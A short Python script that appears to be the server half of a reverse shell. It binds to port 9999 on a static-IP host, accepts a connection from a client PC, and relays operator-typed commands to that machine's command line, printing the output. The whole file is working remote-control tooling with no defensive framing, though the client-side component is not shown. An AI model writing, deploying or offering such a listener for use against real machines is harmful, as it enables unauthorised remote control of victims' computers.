"""This file goes to server (static ip) for stably access
and helps to access client PC's command-line remotely"""

import socket
import sys

# create socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print(f"Error: {msg}")

    except OSError as err:
        print(err)

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print(f"binding the Port: {port}")
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(f"Error : {msg} \n Retry....")
        bind_socket()

# Establish connection with client (the socet must be listening)

def socket_accept():
    try:
        global s
        conn, address = s.accept()
        print(f"connection etablished with {address[0]}")

        send_commands(conn)
        conn.close()
    except socket.error as msg:
        print(f"Error : {msg}")

# sends commands to client
def send_commands(connection):
    while True:
        global s

        cmd = input(">>> ")
        if cmd == "exit":
            connection.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0: #encode into byte format
            connection.send(str.encode(cmd))
            client_res = str(connection.recv(1024), "utf-8")
            print(client_res, end="")

def main():
    try:
        create_socket()
        bind_socket()
        socket_accept()
    except KeyboardInterrupt:
        print("Server goes Down")

main()